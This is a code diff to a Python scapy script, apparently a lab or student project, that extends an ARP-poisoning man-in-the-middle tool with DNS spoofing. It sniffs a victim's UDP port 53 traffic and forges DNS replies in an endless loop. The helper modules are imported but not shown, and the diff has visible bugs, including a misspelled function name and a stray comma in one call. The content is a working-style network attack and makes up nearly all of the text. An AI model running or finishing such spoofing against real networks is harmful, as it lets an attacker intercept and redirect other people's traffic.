@@ -7,6 +7,7 @@ from threading import Lock
 import arpSpoof
 import util
 import interceptor
+import dnsSpoofing
 
 lock = Lock()
 networkInterface = "enp0s3"
@@ -38,20 +39,36 @@ class sniffer():
         self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
         self.interceptedPkt = []
 
-    def startSniff(self):
-        sniff(prn=self.intercept, iface=networkInterface, filter="ip", timeout = 20)
+    def startSniffArp(self):
+        sniff(prn=self.interceptARP, iface=networkInterface, filter="ip", timeout = 20)
 
-    def intercept(self, pkt):
-        interceptor.intercept(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface)
+    def startSniffDNS(self):
+        sniff(filter="udp port 53", iface=networkInterface, prn=self.interceptDNS, store=0, timeout = 20)
 
-    def spoof(self):
+    def interceptARP(self, pkt):
+         interceptor.interceptARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface)
+
+    def dnsResponse(self, pkt, hostIP, mac):
+        dnsSpoofing.dns_call(pkt, hostIP, mac, self,networkInterface, self.attackerMAC)
+
+    def interceptDNS(self, pkt):
+        pkt, hostIP, mac =interceptor.interceprDNS(pkt, self.networkInterface)
+        self.dnsResponse(pkt, hostIP, mac)
+
+    def spoofARP(self):
         arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)
 
-    def start(self):
-        while (True):
-            test.spoof()
-            test.startSniff()
 
+
+    def startARP(self):
+        while (True):
+            test.spoofARP()
+            test.startSniffArp()
+
+    def startDNS(self):
+        while (True):
+            test.spoofARP()
+            test.startSniffDNS()
 test = sniffer(networkInterface, [victimIP], [spoofIP], get_if_hwaddr(networkInterface))
 
-test.start()
+test.startDNS()
